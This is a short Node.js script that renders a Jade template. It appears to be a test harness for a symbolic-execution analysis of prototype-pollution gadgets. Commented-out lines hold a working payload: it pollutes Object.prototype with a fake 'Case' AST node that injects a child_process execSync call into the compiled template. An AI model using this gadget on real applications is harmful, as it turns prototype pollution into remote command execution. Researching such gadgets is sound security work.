var jade = require('jade');
const path = require('path');
const templatePath = path.join(__dirname+'/views/', 'attrs.jade');

// Object.prototype.self = 1;
// Object.prototype.block = {
//     type: 'Case',
//     expr: 'self){}\nglobal.process.mainModule.require("child_process").execSync("sleep 10");{//',    
//     // helper property
//     block: {
//         type: 'Literal',
//         str: ''
//     }
// }

try{
    Object._expose.setupSymbols()
}
catch(e){
    console.log("[!] symbolic execution not enabled")
}


jade.renderFile(templatePath);